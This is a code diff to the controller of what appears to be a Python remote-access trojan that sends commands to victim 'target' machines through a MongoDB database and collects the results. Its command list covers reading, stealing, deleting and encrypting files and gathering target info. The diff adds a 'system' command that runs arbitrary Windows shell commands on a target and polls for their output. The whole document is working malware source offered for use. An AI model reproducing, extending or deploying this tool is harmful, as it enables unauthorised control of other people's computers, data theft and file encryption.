@@ -18,7 +18,7 @@ client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
 db=client['shell']
 
-MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver']
+MY_COMMANDS=['dir --> target machine current directory contents','cd --> 1 step forward directory','cd.. --> 1 step backward directory','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system --> helps to perform any system command for windows']
 
 CWD=r""
 LAST_PATH=""
@@ -83,6 +83,64 @@ def getTargetMachine():
     else:
         TARGET='None'
         IP='None'
+
+def systemCommandsHandeler():
+    global PREV_COMMAND,CWD,TARGET
+    a=PREV_COMMAND.split(" ")
+    count=0
+    new_cmd=""
+    col=db['myshell']
+    for i in a:
+        count+=1
+        if i=='system':
+            continue
+        else:
+            if count==len(a):
+                new_cmd+=i+" "+"|"+" "+"clip"
+            else:
+                new_cmd+=i+" "
+    data={
+        "action":new_cmd,
+        "target":TARGET,
+        "current_path":CWD,
+        "target_string":"",
+        "target_element":"",
+        "new_filename":"",
+        "is_systemCommand":1
+        }
+    try:
+        if not (col.find_one()):
+            col.insert_one(data)
+            result_for_systemCommand()
+        else:
+            filters={
+                "target":TARGET
+                }
+            col.delete_one(filters)
+            col.insert_one(data)
+            result_for_systemCommand()
+    except Exception as e:
+                print(e)
+
+
+def result_for_systemCommand():
+    col=db['shellresult']
+    filters={
+            "hostname":TARGET
+        }
+    while True:
+        try:
+            listen=col.find_one(filter=filters)
+            if listen['result'] and listen['hostname']:
+                print(Fore.CYAN+">>> ")
+                print(listen['result'])
+                break
+            elif listen['result']=="" and listen['hostname']:
+                break
+        except:
+            pass
+
+
 
 def operation():
     global CWD
@@ -196,7 +254,7 @@ def ActionUploader():
                 "target_element":a[1],
                 "new_filename":"",
                 "target_string":"",
-                "process_taken":0
+                "is_systemCommand":0
                 }
         try:
                 if not (col.find_one()):
@@ -218,6 +276,9 @@ def ActionUploader():
         clearCollection()
         CWD=""
         PREV_COMMAND=""
+    
+    elif a[0]=='system':
+        systemCommandsHandeler()
 
     elif a[0]=='getalltypefiles' and len(a)==2:
         target_element=a[1]
@@ -228,7 +289,7 @@ def ActionUploader():
                 "target_element":a[1],
                 "new_filename":"",
                 "target_string":"",
-                "process_taken":0
+                "is_systemCommand":0
                 }
         try:
             if not (col.find_one()):
@@ -259,7 +320,7 @@ def ActionUploader():
                 "target_element":target_element,
                 "new_filename":"",
                 "target_string":"",
-                "process_taken":0
+                "is_systemCommand":0
                 }
             elif len(a)>=3:
                 if a[0]=='updatefile':
@@ -274,7 +335,7 @@ def ActionUploader():
                         "target_element":target_element,
                         "target_string":target_string,
                         "new_filename":"",
-                        "process_taken":0
+                        "is_systemCommand":0
                         }
                 elif a[0]=='renamefile':
                     target_element=a[1]
@@ -286,7 +347,7 @@ def ActionUploader():
                         "target_element":target_element,
                         "new_filename":new_filename,
                         "target_string":"",
-                        "process_taken":0
+                        "is_systemCommand":0
                         }
             else:
                 data={
@@ -296,7 +357,7 @@ def ActionUploader():
                 "target_string":"",
                 "target_element":"",
                 "new_filename":"",
-                "process_taken":0
+                "is_systemCommand":0
                 }
             try:
                 if not (col.find_one()):
